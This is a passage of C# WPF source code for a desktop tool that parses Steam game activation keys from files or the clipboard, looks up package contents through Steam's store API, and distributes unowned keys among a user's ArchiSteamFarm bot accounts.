using MahApps.Metro.Controls;
using Microsoft.WindowsAPICodePack.Dialogs;
using MoreLinq;
using Newtonsoft.Json;
using RestSharp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using Viole_Logger_Interface;

namespace LogChecker
{
    public partial class Program
    {
        private static readonly Logger Logger = new Logger("Viole Logger.exe");

        private static readonly string ConfigDirectory = "config";
        private static readonly string ConfigFile = Path.Combine(ConfigDirectory, "config.json");

        private static readonly string BinFile = Path.Combine(ConfigDirectory, "bin.db");
        private static readonly string BackupDirectory = Path.Combine(ConfigDirectory, "backup");

        private static readonly string DebugDirectory = "debug";

        private static readonly object Lock = new object();

        private Thread[] Thread;

        private int Checked = 0;

        public string[] WIN_RAR = new string[]
        {
            ".RAR",
            ".ZIP",
            ".7Z"
        };

        #region Auto

        public class IAuto : INotifyPropertyChanged
        {
            private bool _Progress;

            public bool Progress
            {
                get => _Progress;
                set
                {
                    _Progress = value;

                    NotifyPropertyChanged(nameof(Progress));
                }
            }

            private Example.ProgressBar _ProgressBar;

            public Example.ProgressBar ProgressBar
            {
                get => _ProgressBar;
                set
                {
                    _ProgressBar = value;

                    NotifyPropertyChanged(nameof(ProgressBar));
                }
            }

            #region Type

            public enum EType : byte
            {
                Check,
                Sort,
                History,
                Bin
            }

            public class IType : INotifyPropertyChanged
            {
                private EType _Value = EType.Check;

                public EType Value
                {
                    get => _Value;
                    set
                    {
                        _Value = value;

                        NotifyPropertyChanged(nameof(Value));
                    }
                }

                public event PropertyChangedEventHandler PropertyChanged;

                public void NotifyPropertyChanged(string propertyName = null)
                {
                    PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
                }
            }

            #endregion

            private IType _Type = new IType();

            public IType Type
            {
                get => _Type;
                set
                {
                    _Type = value;

                    NotifyPropertyChanged(nameof(Type));
                }
            }

            #region Summary

            public class ISummary : INotifyPropertyChanged
            {
                private bool _Show;

                public bool Show
                {
                    get => _Show;
                    set
                    {
                        _Show = value;

                        NotifyPropertyChanged(nameof(Show));
                    }
                }

                public class IList
                {
                    public string Geometry { get; set; }
                    public string ToolTip { get; set; }
                    public string Binding { get; set; }
                    public byte Width { get; set; }
                    public byte Height { get; set; }

                    public IList(string Geometry, string ToolTip, string Binding, byte Width, byte Height)
                    {
                        this.Geometry = Geometry;
                        this.ToolTip = ToolTip;
                        this.Binding = Binding;
                        this.Width = Width;
                        this.Height = Height;
                    }
                }

                private List<IList> _List;

                public List<IList> List
                {
                    get => _List;
                    set
                    {
                        _List = value;

                        NotifyPropertyChanged(nameof(List));
                    }
                }

                private int _K;

                public int K
                {
                    get => _K;
                    set
                    {
                        _K = value;

                        NotifyPropertyChanged(nameof(K));
                    }
                }

                private int _G;

                public int G
                {
                    get => _G;
                    set
                    {
                        _G = value;

                        NotifyPropertyChanged(nameof(G));
                    }
                }

                private int _B;

                public int B
                {
                    get => _B;
                    set
                    {
                        _B = value;

                        NotifyPropertyChanged(nameof(B));
                    }
                }

                private int _C;

                public int C
                {
                    get => _C;
                    set
                    {
                        _C = value;

                        NotifyPropertyChanged(nameof(C));
                    }
                }

                public event PropertyChangedEventHandler PropertyChanged;

                public void NotifyPropertyChanged(string propertyName = null)
                {
                    PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
                }
            }

            #endregion

            private ISummary _Summary = new ISummary();

            public ISummary Summary
            {
                get => _Summary;
                set
                {
                    _Summary = value;

                    NotifyPropertyChanged(nameof(Summary));
                }
            }

            #region Helper

            public class IHelper : INotifyPropertyChanged
            {
                public static string Pattern => @"[0-9A-Z]{4,7}-[0-9A-Z]{4,7}-[0-9A-Z]{4,7}(?:(?:-[0-9A-Z]{4,7})?(?:-[0-9A-Z]{4,7}))?";

                public class ISort : INotifyPropertyChanged
                {
                    private string _DirectoryValue;

                    public string DirectoryValue
                    {
                        get => _DirectoryValue;
                        set
                        {
                            _DirectoryValue = value;

                            NotifyPropertyChanged(nameof(DirectoryValue));
                        }
                    }

                    private List<string> _Primary = new List<string>();

                    public List<string> Primary
                    {
                        get => _Primary;
                        set
                        {
                            _Primary = value;

                            NotifyPropertyChanged(nameof(Primary));
                        }
                    }

                    private bool _Reverse;

                    public bool Reverse
                    {
                        get => _Reverse;
                        set
                        {
                            _Reverse = value;

                            NotifyPropertyChanged(nameof(Reverse));
                        }
                    }

                    public enum EType : byte
                    {
                        Default,
                        Enough,
                        Clipboard
                    }

                    private EType _Type;

                    public EType Type
                    {
                        get => _Type;
                        set
                        {
                            _Type = value;

                            NotifyPropertyChanged(nameof(Type));
                        }
                    }

                    private Example.ProgressBar _ProgressBar;

                    public Example.ProgressBar ProgressBar
                    {
                        get => _ProgressBar;
                        set
                        {
                            _ProgressBar = value;

                            NotifyPropertyChanged(nameof(ProgressBar));
                        }
                    }

                    private ICommand _Switch;

                    public ICommand Switch
                    {
                        get
                        {
                            return _Switch ?? (_Switch = new RelayCommand(Execute => ISwitch()));
                        }
                    }

                    private void ISwitch()
                    {
                        switch (Type)
                        {
                            case EType.Default:
                                Type = EType.Enough;

                                break;
                            case EType.Enough:
                                Type = EType.Clipboard;

                                break;
                            case EType.Clipboard:
                                Type = EType.Default;

                                break;
                        }
                    }

                    private ICommand _Button;

                    public ICommand Button
                    {
                        get
                        {
                            return _Button ?? (_Button = new RelayCommand(async Execute => await IButton()));
                        }
                    }

                    public async Task IButton()
                    {
                        if (Type == EType.Clipboard)
                        {
                            var StructureList = new List<IStructure>();

                            string Data = Clipboard.GetText();

                            if (string.IsNullOrEmpty(Data))
                            {
                                Logger.LogGenericWarning("Буфер обмена пуст!");

                                return;
                            }

                            StructureList.AddRange(Matches(Data));

                            if (StructureList != null && StructureList.Count > 0)
                            {
                                await Function(StructureList);
                            }
                        }
                        else
                        {
                            if (Primary == null || Primary.Count == 0)
                            {
                                Logger.LogGenericWarning("Файлы не были найдены!");

                                return;
                            }

                            var StructureList = new List<IStructure>();

                            foreach (var Value in Primary)
                            {
                                StructureList.AddRange(Matches(
                                    File.ReadAllText(Value),
                                    Value));
                            }

                            if (StructureList != null && StructureList.Count > 0)
                            {
                                StructureList = StructureList
                                    .OrderBy(x => x.Bot)
                                    .ToList();

                                await Function(StructureList);
                            }
                        }
                    }

                    public enum EPurchase : byte
                    {
                        Unknown,

                        BadActivationCode,
                        DuplicateActivationCode,

                        DLC,
                        Restricted,
                        Already,

                        YourSelf
                    }

                    public class IStructure
                    {
                        public string Name { get; set; }

                        public string Default { get; set; }

                        public Dictionary<uint, string> Package { get; set; } = new Dictionary<uint, string>();

                        public IEnumerable<string> List
                        {
                            get
                            {
                                var X = new List<string>()
                                {
                                    Name,
                                    Default
                                };

                                if (Package.Count > 0)
                                {
                                    X.AddRange(Package
                                        .DistinctBy(x => x.Value)
                                        .Select(x => x.Value));
                                }

                                return X.Distinct();
                            }
                        }

                        public EPurchase Purchase { get; set; } = EPurchase.Unknown;

                        public string Key { get; set; }

                        public string Bot { get; set; }

                        public uint PackageID { get; set; }

                        public override string ToString()
                        {
                            return $"{Name}\t{Key}";
                        }

                        private readonly Dictionary<string, string> Escape = new Dictionary<string, string>()
                        {
                            { "&amp;", "&" },
                            { "&lt;", "<" },
                            { "&gt;", ">" },
                            { "&quot;", "\"" },
                            { "&apos;", "'" },
                        };

                        public IStructure(string Name, string Key)
                        {
                            try
                            {
                                this.Name = Name;

                                Purchase = EPurchase.Already;

                                this.Key = Key;
                            }
                            catch (Exception e)
                            {
                                Logger.LogGenericException(e);
                            }
                        }

                        public IStructure(string Name, string Purchase, string Key, string FileValue, string PackageID, string Default)
                        {
                            try
                            {
                                if (Name == Key)
                                {
                                    this.Name = "Unknown";
                                }
                                else
                                {
                                    foreach (KeyValuePair<string, string> Pair in Escape)
                                    {
                                        this.Name = Name.Replace(Pair.Key, Pair.Value);
                                    }
                                }

                                switch (Purchase)
                                {
                                    case "DoesNotOwnRequiredApp":
                                        this.Purchase = EPurchase.DLC;

                                        break;

                                    case "RestrictedCountry":
                                        this.Purchase = EPurchase.Restricted;

                                        break;

                                    case "AlreadyPurchased":
                                        this.Purchase = EPurchase.Already;

                                        break;

                                    default:
                                        if (Enum.TryParse<EPurchase>(Purchase, true, out var X))
                                        {
                                            this.Purchase = X;
                                        }

                                        break;
                                }

                                this.Key = Key;

                                if (!string.IsNullOrEmpty(FileValue) && FileValue.Contains(".keys"))
                                {
                                    Bot = Path.GetFileName(FileValue).Split(new[] { '.' }, 2)[0];
                                }

                                if (!string.IsNullOrEmpty(PackageID) && uint.TryParse(PackageID, out uint PID) && PID > 0)
                                {
                                    this.PackageID = PID;
                                }

                                if (!string.IsNullOrEmpty(Default))
                                {
                                    this.Default = Default.TrimStart().TrimEnd();
                                }
                            }
                            catch (Exception e)
                            {
                                Logger.LogGenericException(e);
                            }
                        }
                    }

                    private IEnumerable<IStructure> Matches(string KeyList, string FileValue = "")
                    {
                        foreach (Match Match in Regex.Matches(KeyList, @"(.+)\t" + $"({Pattern})"))
                        {
                            yield return Matches(Match.Groups, FileValue);
                        }
                    }

                    private IStructure Matches(GroupCollection GroupCollection, string FileValue)
                    {
                        try
                        {
                            if (GroupCollection[1].Success &&
                                GroupCollection[2].Success)
                            {
                                string Unknown = GroupCollection[1].Value;
                                string Key = GroupCollection[2].Value;
                                int Length = Unknown.Split('\t').Length;

                                if (Length > 0)
                                {
                                    string Pattern = "";

                                    switch (Length)
                                    {
                                        case 2:
                                            Pattern = @"(.+)\t\[(.+)\]"; // Restricted

                                            break;

                                        case 3:
                                            Pattern = @"(.+)\t\[(.+)\]\t\[([0-9]+), (.+)\]";

                                            break;
                                    }

                                    if (string.IsNullOrEmpty(Pattern))
                                    {
                                        return new IStructure(Unknown, Key);
                                    }
                                    else
                                    {
                                        var Match = Regex.Match(
                                            Unknown.TrimStart().TrimEnd(),
                                            Pattern);

                                        if (Match.Groups[1].Success &&
                                            Match.Groups[2].Success)
                                        {
                                            string Name = Match.Groups[1].Value;
                                            string Purchase = Match.Groups[2].Value;
                                            string PackageID = Match.Groups[3].Value;
                                            string Default = Match.Groups[4].Value;

                                            return new IStructure(Name, Purchase, Key, FileValue, PackageID, Default);
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }

                        return null;
                    }

                    public class IPackage
                    {
                        [JsonProperty("success")]
                        public bool Success { get; set; }

                        public class IData
                        {
                            [JsonProperty("name")]
                            public string Name { get; set; }

                            public class IApp
                            {
                                [JsonProperty("id")]
                                public string ID { get; set; }

                                [JsonProperty("name")]
                                public string Name { get; set; }
                            }

                            [JsonProperty("apps")]
                            public List<IApp> App { get; set; }
                        }

                        [JsonProperty("data")]
                        public IData Data { get; set; }
                    }

                    private async Task Function(List<IStructure> StructureList)
                    {
                        try
                        {
                            if (StructureList.Count > 0)
                            {
                                StructureList.RemoveAll(x => x.Purchase == EPurchase.DuplicateActivationCode);

                                if (Type == EType.Clipboard)
                                {
                                    OrderBy(StructureList);
                                }
                                else
                                {
                                    var DirectoryValue = Combine(this.DirectoryValue, "ASF");

                                    var Dictionary = new Dictionary<string, (Dictionary<uint, string> App, List<uint> Package)>();

                                    var SteamIDs = Auto.Config.AccountList
                                        .Select((x, i) => (Key: x, Index: i))
                                        .ToDictionary(x => x.Key, x => x.Index);

                                    if (SteamIDs.Count > 0)
                                    {
                                        var Select = new Selection(SteamIDs, true);

                                        if (Select.ShowDialog() ?? false)
                                        {
                                            if (Select.Auto.Package)
                                            {
                                                try
                                                {
                                                    var _ = StructureList
                                                        .Where(x =>
                                                            x.Purchase == EPurchase.Already ||
                                                            x.Purchase == EPurchase.BadActivationCode // Настоящий результат активации неизвестен, появляется во время технических работ в стиме.
                                                        )
                                                        .ToList();

                                                    ProgressBar = new Example.ProgressBar
                                                    {
                                                        Maximum = _.Count,
                                                        Value = 0
                                                    };

                                                    foreach ((IStructure Value, int Index) in _
                                                        .Select((x, i) => (Value: x, Index: i + 1))
                                                        .ToList())
                                                    {
                                                        if (Value.PackageID <= 0) continue;

                                                        try
                                                        {
                                                            var Client = new RestClient(
                                                                new RestClientOptions()
                                                                {
                                                                    UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                                                                    MaxTimeout = 300000
                                                                });

                                                            var Request = new RestRequest($"https://store.steampowered.com/api/packagedetails?packageids={Value.PackageID}");

                                                            for (byte i = 0; i < 3; i++)
                                                            {
                                                                try
                                                                {
                                                                    var Execute = await Client.ExecuteGetAsync(Request);

                                                                    if ((int)Execute.StatusCode == 429)
                                                                    {
                                                                        Logger.LogGenericWarning("Слишком много запросов!");

                                                                        await Task.Delay(TimeSpan.FromMinutes(2.5));

                                                                        continue;
                                                                    }

                                                                    if (string.IsNullOrEmpty(Execute.Content))
                                                                    {
                                                                        if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                                                        {
                                                                            Logger.LogGenericWarning("Ответ пуст!");
                                                                        }
                                                                        else
                                                                        {
                                                                            Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                                                        }
                                                                    }
                                                                    else
                                                                    {
                                                                        if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                                                        {
                                                                            if (Logger.Helper.IsValidJson(Execute.Content))
                                                                            {
                                                                                try
                                                                                {
                                                                                    var JSON = JsonConvert.DeserializeObject<Dictionary<string, IPackage>>(Execute.Content);

                                                                                    if (JSON == null)
                                                                                    {
                                                                                        Logger.LogGenericWarning($"Ошибка: {Execute.Content}.");
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                        foreach (var V in JSON)
                                                                                        {
                                                                                            if (V.Value.Success)
                                                                                            {
                                                                                                if (V.Value.Data == null || V.Value.Data.App == null) continue;

                                                                                                foreach (var App in V.Value.Data.App)
                                                                                                {
                                                                                                    if (uint.TryParse(App.ID, out uint ID) && ID > 0)
                                                                                                    {
                                                                                                        Value.Package.Add(ID, App.Name);
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }

                                                                                    break;
                                                                                }
                                                                                catch (Exception e)
                                                                                {
                                                                                    Logger.LogGenericException(e);
                                                                                }
                                                                            }
                                                                            else
                                                                            {
                                                                                Logger.LogGenericWarning($"Ошибка: {Execute.Content}");
                                                                            }
                                                                        }
                                                                        else
                                                                        {
                                                                            Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                                                        }
                                                                    }

                                                                    await Task.Delay(2500);
                                                                }
                                                                catch (Exception e)
                                                                {
                                                                    Logger.LogGenericException(e);
                                                                }
                                                            }
                                                        }
                                                        catch (Exception e)
                                                        {
                                                            Logger.LogGenericException(e);
                                                        }
                                                        finally
                                                        {
                                                            ProgressBar.Value = Index;

                                                            await Task.Delay(250);
                                                        }
                                                    }
                                                }
                                                catch (Exception e)
                                                {
                                                    Logger.LogGenericException(e);
                                                }
                                                finally
                                                {
                                                    ProgressBar.Dispose();
                                                    ProgressBar = null;
                                                }
                                            }

                                            try
                                            {
                                                var _ = Select.Auto.List
                                                    .Select(x => x)
                                                    .Where(x => x.Checked)
                                                    .ToList();

                                                ProgressBar = new Example.ProgressBar
                                                {
                                                    Maximum = _.Count,
                                                    Value = 0
                                                };

                                                foreach (var T in _
                                                    .Select((x, i) => (T: x, Index: i + 1))
                                                    .ToList())
                                                {
                                                    try
                                                    {
                                                        var App = await GetApp(T.T.Pair.Value, T.T.Index);

                                                        if (App == null) continue;

                                                        var Package = await GetPackage(T.T.Pair.Value, T.T.Index);

                                                        if (Package == null) continue;

                                                        if (App.Count > 0 || Package.Count > 0)
                                                        {
                                                            Logger.LogGenericDebug($"{T.T.Pair.Key} [{T.T.Index}] - App: {App.Count} | Package: {Package.Count}");

                                                            Dictionary.Add(T.T.Index, (App, Package));
                                                        }
                                                    }
                                                    finally
                                                    {
                                                        ProgressBar.Value = T.Index;

                                                        await Task.Delay(500);
                                                    }
                                                }
                                            }
                                            catch (Exception e)
                                            {
                                                Logger.LogGenericException(e);
                                            }
                                            finally
                                            {
                                                ProgressBar.Dispose();
                                                ProgressBar = null;
                                            }
                                        }
                                    }
                                    else
                                    {
                                        Logger.LogGenericWarning("Выбор не может быть сделан!");
                                    }

                                    if (Dictionary.Count == 0)
                                    {
                                        Logger.LogGenericWarning("Список лицензий отсутствует!");

                                        return;
                                    }

                                    if (Reverse)
                                    {
                                        Dictionary = Dictionary
                                            .Reverse()
                                            .ToDictionary(x => x.Key, x => x.Value);
                                    }

                                    foreach (var List in Dictionary)
                                    {
                                        try
                                        {
                                            string DB = Path.Combine(BackupDirectory, $"{List.Key}.db");

                                            if (StructureList.Any(x => (byte)x.Purchase < 6))
                                            {
                                                var X = StructureList
                                                    .Where(x =>
                                                        x.Purchase == EPurchase.Already ||
                                                        x.Purchase == EPurchase.BadActivationCode // Настоящий результат активации неизвестен, появляется во время технических работ в стиме.
                                                     )
                                                    .Where(x => string.IsNullOrEmpty(x.Bot) || !x.Bot.Contains(List.Key))
                                                    .Where(x =>
                                                    {
                                                        if (!File.Exists(DB)) return true;

                                                        string[] ARRAY = File.ReadAllLines(DB);

                                                        if (ARRAY == null || ARRAY.Length == 0) return true;

                                                        return !ARRAY.Any(v => v == x.ToString());
                                                    })
                                                    .Where(x =>
                                                    {
                                                        int Count = Regex.Matches(x.Name, ", ").Count;
                                                        var Match = Regex.Match(x.Name, ", &|and");

                                                        if (Count > 1 && Match.Success)
                                                        {
                                                            x.Purchase = EPurchase.YourSelf;

                                                            return false; // Скип.
                                                        }

                                                        bool App = !List.Value.App.Any(v =>
                                                        {
                                                            if (x.Package.ContainsKey(v.Key))
                                                            {
                                                                return true;
                                                            }

                                                            foreach (string Value in x.List)
                                                            {
                                                                if (string.IsNullOrEmpty(Value)) continue;

                                                                if (Value == v.Value)
                                                                {
                                                                    return true;
                                                                }
                                                            }

                                                            return false;
                                                        });

                                                        bool Package = !List.Value.Package.Any(PackageID =>
                                                        {
                                                            if (x.PackageID == PackageID)
                                                            {
                                                                return true;
                                                            }

                                                            return false;
                                                        });

                                                        return App && (x.PackageID == 0 || Package);
                                                    })
                                                    .ToList();

                                                if (Type == EType.Enough)
                                                {
                                                    X = X
                                                        .GroupBy(x => x.Name)
                                                        .SelectMany(x => x
                                                            .ToList()
                                                            .Take(1))
                                                        .ToList();
                                                }

                                                if (X.Count > 0)
                                                {
                                                    StructureList.RemoveAll(x => X.Any(v => v.Key == x.Key));

                                                    string Stock = $"{string.Join("\n", X.OrderBy(x => x.Name).Select(x => x.ToString()))}\n";

                                                    try
                                                    {
                                                        lock (Lock)
                                                        {
                                                            File.AppendAllText(
                                                                DB,
                                                                Stock);
                                                        }

                                                        lock (Lock)
                                                        {
                                                            File.AppendAllText(
                                                                Path.Combine(DirectoryValue, $"{List.Key}.keys"),
                                                                Stock);
                                                        }
                                                    }
                                                    catch (Exception e)
                                                    {
                                                        Logger.LogGenericException(e);
                                                    }
                                                }
                                            }
                                        }
                                        catch (Exception e)
                                        {
                                            Logger.LogGenericException(e);
                                        }
                                    }

                                    if (StructureList.Count > 0)
                                    {
                                        OrderBy(StructureList);
                                    }

                                    Logger.LogGenericInfo("Сортировка завершена!");
                                }
                            }
                            else
                            {
                                Logger.LogGenericWarning("В файлах отсутствуют ключи!");
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }

                    private void OrderBy(List<IStructure> StructureList)
                    {
                        try
                        {
                            var GroupBy = StructureList
                                .GroupBy(x => x.Purchase)
                                .Select(x => new
                                {
                                    x.Key,
                                    List = string.Join("\n", x.Select(v => v.ToString())),
                                    Stock = string.Join(", ", x.Select(v => v.Key))
                                })
                                .ToList();

                            if (GroupBy.Count > 0)
                            {
                                var T = GroupBy
                                    .OrderBy(x => x.Key)
                                    .SelectMany((x, i) =>
                                    {
                                        var List = new List<Run>();

                                        if (i > 0)
                                        {
                                            List.Add(new Run("\n\r"));
                                        }

                                        List.Add(new Run($"{x.Key.ToString().ToUpper()}:\n") { Foreground = Brushes.Red });
                                        List.Add(new Run(x.List));

                                        if (x.Key == EPurchase.Already || x.Key == EPurchase.YourSelf)
                                        {
                                            List.Add(new Run($"\n\r{x.Stock}") { Foreground = Brushes.Green });
                                        }

                                        return List;
                                    });

                                if (T.Any())
                                {
                                    new Conclusion(T).ShowDialog();

                                    var Thread = new Thread(() => Clipboard.SetText($"{string.Join("", T.Select(x => x.Text))}\n"));

                                    Thread.SetApartmentState(ApartmentState.STA);
                                    Thread.Start();
                                    Thread.Join();

                                    Logger.LogGenericInfo("Оставшееся ключи были скопированные в буфер обмена!");
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }

                    public event PropertyChangedEventHandler PropertyChanged;

                    public void NotifyPropertyChanged(string propertyName = null)
                    {
                        PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
                    }
                }

                private ISort _Sort = new ISort();

                public ISort Sort
                {
                    get => _Sort;
                    set
                    {
                        _Sort = value;

                        NotifyPropertyChanged(nameof(Sort));
                    }
                }

                public class IUnite : INotifyPropertyChanged
                {
                    private string _DirectoryValue;

                    public string DirectoryValue
                    {
                        get => _DirectoryValue;
                        set
                        {
                            _DirectoryValue = value;

                            NotifyPropertyChanged(nameof(DirectoryValue));
                        }
                    }

                    private List<string> _Primary = new List<string>();

                    public List<string> Primary
                    {
                        get => _Primary;
                        set
                        {
                            _Primary = value;

                            NotifyPropertyChanged(nameof(Primary));
                        }
                    }

                    private ICommand _Button;

                    public ICommand Button
                    {
                        get
                        {
                            return _Button ?? (_Button = new RelayCommand(Execute => IButton()));
                        }
                    }

                    public void IButton()
                    {
                        var List = new List<string>();

                        foreach (string X in Primary)
                        {
                            List.Add(File.ReadAllText(X));
                        }

                        try
                        {
                            lock (Lock)
                            {
                                File.AppendAllText(
                                    Path.Combine(DirectoryValue, "_.txt"),
                                    string.Join("", List));
                            }

                            Logger.LogGenericInfo("Комбинирование завершена!");
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }

                    public event PropertyChangedEventHandler PropertyChanged;

                    public void NotifyPropertyChanged(string propertyName = null)
                    {
                        PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
                    }
                }

                private IUnite _Unite = new IUnite();

                public IUnite Unite
                {
                    get => _Unite;
                    set
                    {
                        _Unite = value;

                        NotifyPropertyChanged(nameof(Unite));
                    }
                }

                public event PropertyChangedEventHandler PropertyChanged;

                public void NotifyPropertyChanged(string propertyName = null)
                {
                    PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
                }
            }

            #endregion

            private IHelper _Helper = new IHelper();

            public IHelper Helper
            {
                get => _Helper;
                set
                {
                    _Helper = value;

                    NotifyPropertyChanged(nameof(Helper));
                }
            }

            private IConfig _Config;

            public IConfig Config
            {
                get => _Config;
                set
                {
                    _Config = value;

                    NotifyPropertyChanged(nameof(Config));
                }
            }

            private List<ILog> _LogList = new List<ILog>();

            public List<ILog> LogList
            {
                get => _LogList;
                set
                {
                    _LogList = value;

                    NotifyPropertyChanged(nameof(LogList));
                }
            }

            private List<string> _DirectoryList = new List<string>();

            public List<string> DirectoryList
            {
                get => _DirectoryList;
                set
                {
                    _DirectoryList = value;

                    NotifyPropertyChanged(nameof(DirectoryList));
                }
            }

            private string _Directory;

            public string Directory
            {
                get => _Directory;
                set
                {
                    _Directory = value;

                    NotifyPropertyChanged(nameof(Directory));
                }
            }

            private ICommand _OpenL;

            public ICommand OpenL
            {
                get
                {
                    return _OpenL ?? (_OpenL = new RelayCommand(Execute =>
                    {
                        if (!string.IsNullOrEmpty(Config.Log))
                        {
                            System.Diagnostics.Process.Start(Config.Log);
                        }
                    }));
                }
            }

            private ICommand _OpenR;

            public ICommand OpenR
            {
                get
                {
                    return _OpenR ?? (_OpenR = new RelayCommand(Execute =>
                    {
                        if (!string.IsNullOrEmpty(Directory))
                        {
                            System.Diagnostics.Process.Start(Directory);
                        }
                    }));
                }
            }

            public event PropertyChangedEventHandler PropertyChanged;

            public void NotifyPropertyChanged(string propertyName = null)
            {
                PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
            }
        }

        #endregion

        public static readonly IAuto Auto = new IAuto();

        public Program()
        {
            InitializeComponent();

            DataContext = Auto;
        }

        private void MetroWindow_Loaded(object sender, RoutedEventArgs e) => ILoaded();

        private void ILoaded()
        {
            Auto.Progress = true;

            var ErrorList = new List<string>
            {
                File.Exists(Logger.File)
                    ? ""
                    : "Отсутствует файл запуска консоли!",

                new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
                    ? ""
                    : "Чтобы все корректно работало, программу нужно запустить с правами администратора!"
            };

            ErrorList.RemoveAll(x => string.IsNullOrEmpty(x));

            if (ErrorList.Count > 0)
            {
                Logger.LogGenericWarning(string.Join("\n", ErrorList));

                return;
            }


            var MainWindow = Application.Current.MainWindow;

            int X = (int)MainWindow.RestoreBounds.Left - 5;
            int Y = (int)(MainWindow.RestoreBounds.Top + MainWindow.Height + 10);

            Logger.Setup(X, Y, true);

            (string ErrorMessage, IConfig Config) = IConfig.Load(ConfigDirectory, ConfigFile);

            if (Config == null)
            {
                Logger.LogGenericWarning(ErrorMessage);

                return;
            }
            else
            {
                Auto.Config = Config;
            }

            Init();

            Auto.Progress = false;
        }

        private void MetroWindow_Closing(object sender, CancelEventArgs e)
        {
            try
            {
                Auto.Config?.Save();
            }
            catch { }
        }

        private void Init()
        {
            if (!Directory.Exists(BackupDirectory)) Directory.CreateDirectory(BackupDirectory);

            if (Auto.Config.Checked.Count > 0)
            {
                Auto.Config.Checked = Auto.Config.Checked
                    .DistinctBy(x => x.EMail)
                    .ToList();

                Auto.Config.Checked.OrderBy(x => x.Date);

                Auto.Config.Save();
            }

            Auto.Summary.List = new List<IAuto.ISummary.IList>
            {
                new IAuto.ISummary.IList("M22,18V22H18V19H15V16H12L9.74,13.74C9.19,13.91 8.61,14 8,14A6,6 0 0,1 2,8A6,6 0 0,1 8,2A6,6 0 0,1 14,8C14,8.61 13.91,9.19 13.74,9.74L22,18M7,5A2,2 0 0,0 5,7A2,2 0 0,0 7,9A2,2 0 0,0 9,7A2,2 0 0,0 7,5Z", "Key", "K", 16, 16),
                new IAuto.ISummary.IList("M9.06,1.93C7.17,1.92 5.33,3.74 6.17,6H3A2,2 0 0,0 1,8V10A1,1 0 0,0 2,11H11V8H13V11H22A1,1 0 0,0 23,10V8A2,2 0 0,0 21,6H17.83C19,2.73 14.6,0.42 12.57,3.24L12,4L11.43,3.22C10.8,2.33 9.93,1.94 9.06,1.93M9,4C9.89,4 10.34,5.08 9.71,5.71C9.08,6.34 8,5.89 8,5A1,1 0 0,1 9,4M15,4C15.89,4 16.34,5.08 15.71,5.71C15.08,6.34 14,5.89 14,5A1,1 0 0,1 15,4M2,12V20A2,2 0 0,0 4,22H20A2,2 0 0,0 22,20V12H13V20H11V12H2Z", "Gift", "G", 16, 16),
                new IAuto.ISummary.IList("M425.7 256c-16.9 0-32.8-9-41.4-23.4L320 126l-64.2 106.6c-8.7 14.5-24.6 23.5-41.5 23.5-4.5 0-9-.6-13.3-1.9L64 215v178c0 14.7 10 27.5 24.2 31l216.2 54.1c10.2 2.5 20.9 2.5 31 0L551.8 424c14.2-3.6 24.2-16.4 24.2-31V215l-137 39.1c-4.3 1.3-8.8 1.9-13.3 1.9zm212.6-112.2L586.8 41c-3.1-6.2-9.8-9.8-16.7-8.9L320 64l91.7 152.1c3.8 6.3 11.4 9.3 18.5 7.3l197.9-56.5c9.9-2.9 14.7-13.9 10.2-23.1zM53.2 41L1.7 143.8c-4.6 9.2.3 20.2 10.1 23l197.9 56.5c7.1 2 14.7-1 18.5-7.3L320 64 69.8 32.1c-6.9-.8-13.5 2.7-16.6 8.9z", "Bundle", "B", 18, 16),
                new IAuto.ISummary.IList("M20 4H4A2 2 0 0 0 2 6V18A2 2 0 0 0 4 20H20A2 2 0 0 0 22 18V6A2 2 0 0 0 20 4M20 11H4V8H20Z", "Choice", "C", 18, 14),
            };

            #region Summary

            foreach (var X in Auto.Summary.List)
            {
                var Grid = new Grid();

                var Column1 = new ColumnDefinition();
                Column1.SetValue(ColumnDefinition.WidthProperty, new GridLength(1, GridUnitType.Star));
                var Column2 = new ColumnDefinition();
                Column2.SetValue(ColumnDefinition.WidthProperty, GridLength.Auto);

                Grid.ColumnDefinitions.Add(Column1);
                Grid.ColumnDefinitions.Add(Column2);

                var Button = new Button
                {
                    Width = X.Width,
                    Height = X.Height,
                    HorizontalAlignment = HorizontalAlignment.Left,
                    VerticalAlignment = VerticalAlignment.Center,
                    Margin = new Thickness(0, 5, 5, 0),
                    Background = Brushes.Transparent,
                    BorderBrush = Brushes.Transparent,
                    BorderThickness = new Thickness(0),
                    Focusable = false,
                    ToolTip = X.ToolTip,
                    Style = new Style
                    {
                        TargetType = typeof(Button),
                        BasedOn = (Style)FindResource("MahApps.Styles.Button.Chromeless")
                    }
                };

                Button.SetValue(ControlsHelper.DisabledVisualElementVisibilityProperty, Visibility.Hidden);
                Button.SetValue(ControlsHelper.MouseOverBorderBrushProperty, Brushes.Transparent);
                Button.SetValue(ControlsHelper.FocusBorderBrushProperty, Brushes.Transparent);
